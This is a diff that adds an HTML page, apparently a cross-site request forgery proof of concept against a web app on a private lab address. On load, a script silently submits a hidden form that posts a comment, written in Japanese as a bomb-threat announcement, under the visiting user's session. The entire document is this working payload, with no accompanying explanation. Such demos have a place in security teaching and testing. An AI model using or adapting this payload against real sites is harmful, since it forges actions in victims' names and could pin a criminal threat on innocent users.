@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta charset="UTF-8">
+</head>
+<body>
+<form name="demo" action="http://192.168.33.10/TBK-HM/commins.php" method="post">
+<input type="hidden" name="isbn13" value="978-4041205570">
+<input type="hidden" name="comment" value="コレは犯行予告です。爆破しちゃうぞ。">
+</form>
+<script>
+window.onload=function(){
+	document.forms["demo"].submit();
+}
+</script>
+</body>
+</html>
+
